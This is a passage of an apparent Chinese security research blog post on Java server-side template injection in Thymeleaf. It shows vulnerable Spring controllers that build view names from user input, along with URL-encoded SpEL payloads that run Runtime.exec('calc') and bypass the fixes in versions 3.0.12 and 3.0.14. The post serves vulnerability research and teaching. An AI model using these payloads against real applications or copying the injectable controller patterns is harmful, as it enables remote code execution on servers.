class="hljs-keyword">final</span> <span class="hljs-type">int</span> idx)</span> &#123;<br>       <span class="hljs-type">char</span> c;<br>       <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> idx;<br>       <span class="hljs-keyword">while</span> (n-- != <span class="hljs-number">0</span>) &#123;<br>           c = expression.charAt(n);<br>           <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;T&#x27;</span>) &#123;<br>               <span class="hljs-keyword">return</span> (n == <span class="hljs-number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">1</span>)));<br>           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!Character.isWhitespace(c)) &#123;<br>               <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>           &#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(77, 77, 77);">对”T”的前一个字符会检测是否满足</font><code>&lt;font style=&quot;color:rgb(77, 77, 77);&quot;&gt;Character#isJavaIdentifierPart&lt;/font&gt;</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.ssti.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">helloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span>  <span class="hljs-string">&quot;xxx/&quot;</span>+lang+<span class="hljs-string">&quot;/xxx&quot;</span> ;  <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">__%<span class="hljs-number">24</span>%7B%00T%<span class="hljs-number">20</span>(java.lang.Runtime).getRuntime().exec(%22calc%<span class="hljs-number">22</span>)%7D__%3A%3A.x<br><br>__%<span class="hljs-number">24</span>%7C%7C%7B<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;exec&#x27;</span>%2C<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRuntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>)%2C<span class="hljs-string">&#x27;calc&#x27;</span>)%7D__%3A%3A.x<br><br></code></pre></td></tr></table></figure>
+
+<p>不拼接路径的话会报错</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">helloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span>  lang ;  <span class="hljs-comment">//直接可控</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/javassti/1766498899895-14b3eda9-787d-41d6-9d90-85b4f428368f.png" srcset="/img/loading.gif" lazyload></p>
+<p>下面的方式也可用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">helloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span>  <span class="hljs-string">&quot;xxx::&quot;</span>+lang ;  <br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">helloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span>  lang+<span class="hljs-string">&quot;::xxx&quot;</span> ;  <br>    &#125;<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure>
+
+<p>url方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">helloController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/path/&#123;eval&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String eval)</span> &#123;<br>    &#125;<br>    &#125;<br><br><span class="hljs-comment">//paylaod</span><br>/path;/__%<span class="hljs-number">24</span>%7C%7C%7B<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;exec&#x27;</span>%2C<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRuntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>)%2C<span class="hljs-string">&#x27;calc&#x27;</span>)%7D__%3A%3A.x<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-0-14"><a href="#3-0-14" class="headerlink" title="3.0.14"></a>3.0.14</h4><p><font style="color:rgb(68, 68, 68);">Thymeleaf3.0.14版本的修复，对</font><code>&lt;font style=&quot;color:rgb(68, 68, 68);&quot;&gt;containsSpELInstantiationOrStatic()&lt;/font&gt;</code><font style="color:rgb(68, 68, 68);">函数检测进行了完善，对</font><code>&lt;font style=&quot;color:rgb(68, 68, 68);&quot;&gt;T&lt;/font&gt;</code><font style="color:rgb(68, 68, 68);">和</font><code>&lt;font style=&quot;color:rgb(68, 68, 68);&quot;&gt;()&lt;/font&gt;</code><font style="color:rgb(68, 68, 68);">中间空字符进行绕过修复</font></p>
+<p>payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">__%<span class="hljs-number">24</span>%7C%7C%7B<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;exec&#x27;</span>%2C<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRuntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>)%2C<span class="hljs-string">&#x27;calc&#x27;</span>)%7D__%3A%3A<br></code></pre></td></tr></table></figure>
+
+<p>url方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">/path;/__%<span class="hljs-number">24</span>%7C%7C%7B<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;exec&#x27;</span>%2C<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRuntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>)%2C<span class="hljs-string">&#x27;calc&#x27;</span>)%7D__%3A%3A.x<br><br>/path;/__%<span class="hljs-number">24</span>%7C%7C%7B<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;exec&#x27;</span>%2C<span class="hljs-string">&#x27;&#x27;</span>.getClass()).invoke(<span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getRuntime&#x27;</span>).invoke(<span class="hljs-literal">null</span>)%2C<span class="hljs-string">&#x27;calc&#x27;</span>)%7D__%3A%3A.x<br></code></pre></td></tr></table></figure>
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%A0%94%E7%A9%B6/" class="category-chain-item">研究</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%A0%94%E7%A9%B6/%E7%AC%94%E8%AE%B0/" class="category-chain-item">笔记</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%AC%94%E8%AE%B0/" class="print-no-link">#笔记</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java SSTI</div>
+      <div>http://example.com/2025/12/23/Java SSTI/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>J_0k3r</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY J_0K3R 
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/12/16/%E5%93%A5%E6%96%AF%E6%8B%89/" title="哥斯拉webshell流量特征">
+                        <span class="hidden-mobile">哥斯拉webshell流量特征</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+           <!--音乐--> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css"> <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/meting@1.2/dist/Meting.min.js"></script> <div id="player" class="aplayer aplayer-withlist aplayer-fixed" data-id="9723733050" data-server="netease" data-type="playlist" autoplay="true" data-order="list"  data-fixed="true" data-listfolded="true" data-theme="#2D8CF0"></div> 
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       J_0k3r <i class="iconfont icon-love"></i> Hor1zon<br /> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
